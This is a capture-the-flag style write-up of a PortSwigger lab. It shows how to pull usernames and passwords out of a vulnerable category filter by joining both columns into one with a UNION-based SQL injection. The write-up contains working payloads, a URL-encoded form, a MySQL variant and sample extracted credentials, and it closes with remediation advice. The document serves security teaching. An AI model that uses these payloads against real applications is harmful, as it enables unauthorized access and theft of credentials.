# SQL Injection — UNION Attack: Retrieving Multiple Values in a Single Column

**Lab:** SQL injection UNION attack, retrieving multiple values in a single column
**Level:** Practitioner
**Category:** SQL Injection (UNION)
**Tools:** Burp Suite (Proxy + Repeater), browser
**Lab link:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

---

## Vulnerability Summary

The category filter is vulnerable to SQL injection and the query results are shown on the page. The `users` table has `username` and `password` columns. The goal, again, is to retrieve all usernames/passwords and log in as `administrator`.

What makes this lab different: the original query returns 2 columns but **only one of them is compatible with text data**. Yet we want to retrieve two separate values (`username` + `password`). The solution: **concatenate the two values into a single string** (string concatenation).

## Lab Description

![Lab description](images/06-lab-aciklama.png)

## Solution Steps

### 1. Determine the column count and the text column

We send the request to Burp Repeater and test:

```
Gifts' UNION SELECT NULL,'a'--
```

The response is `200 OK`. We learn two things: the query returns **2 columns**, and the column we can print text into is **column 2** (column 1 is `NULL`, it does not accept text).

![Repeater — NULL,'a', 200 OK](images/06-repeater-sutun-test.png)

So our frame is: `UNION SELECT NULL, <a single text value here>`. We have **only one place** to print text, but the data we want is **two parts**.

### 2. Combine the two values into one column

We concatenate the two parts and insert a separator between them to form a single string:

```
Gifts' UNION SELECT NULL,username||'~'||password FROM users--
```

The response is `200 OK`; the rows from `users` are added to the results in `username~password` form.

![Repeater — username||'~'||password FROM users](images/06-repeater-birlestirme.png)

### 3. View the results in the browser

We run the same payload in the browser via the URL:

```
/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

The usernames and passwords are listed in `administrator~...` form.

![Results in the browser](images/06-tarayici-sonuclar.png)

### 4. Log in as administrator

Thanks to the `~` separator, we can clearly split the `administrator` username and password and log in via the login form. The lab is marked as solved.

![Lab solved — logged in as administrator](images/06-lab-cozuldu.png)

## Why `username || '~' || password`? (The Logic)

The shape of this payload is not arbitrary; it follows directly from the constraint we found in the previous step: **how many columns + which ones accept text.**

### Why `||`?

`||` is a **string concatenation** operator. In databases like Oracle, PostgreSQL and SQLite it joins two strings:

```
'abc' || 'def'   →   'abcdef'
```

### Why combine two values into one column?

This is the core. In step 1 we found the query returns 2 columns but only 1 can hold text. We want two separate values, `username` and `password`. Since there is only one text-capable column, we cannot place the two values in two separate columns (the other column is `NULL` and does not accept text). So we concatenate them into a single string:

```
username || password
```

### Why `'~'`?

If we only did `username || password`, the output would be:

```
administrator74nadky7d5ilnvemweld
```

We could not visually tell where the username ends and the password begins. So we insert a **separator**:

```
username || '~' || password   →   administrator~74nadky7d5ilnvemweld
```

Now the output is clear:

```
administrator~74nadky7d5ilnvemweld
wiener~uyea41dlv3txbg467ykd
carlos~0ncjmy9b59fzwl2bpxj1
```

There is no special reason for choosing `~` — it is preferred because it almost never appears in usernames/passwords and is easy to spot. Another separator like `:`, `|` or `#` would also work.

### "How did we know the format?"

The only thing that decided the format was the constraint: **how many columns + which accept text.** We learned this with `UNION SELECT NULL,'a'--`:

- `NULL` → column 1 (cannot print text)
- `'a'` → column 2 (can print text ✓)

The frame is fixed: `UNION SELECT NULL, <a single text value>`. The data we want is two parts, but we have one slot, so we concatenate with `||` and separate with `~`. The logic is always the same: **fit the data into the number of columns available.**

### DBMS note

This payload is for Oracle / PostgreSQL / SQLite, where `||` is string concatenation. In **MySQL**, `||` means logical `OR` by default and would not work this way; there you would use `CONCAT(username,'~',password)`. Which DBMS is in use is also usually discovered through such experiments.

## Remediation

- **Parameterized queries (prepared statements):** User input must not be concatenated into the query, so `UNION SELECT` and concatenation cannot be injected.
- **Input validation (allow-list):** Validate `category` only against a known set of values.
- **Secure password storage:** Store passwords with a strong hashing algorithm (e.g. bcrypt).
- **Principle of least privilege:** The application's database account should only be able to access the tables it needs.
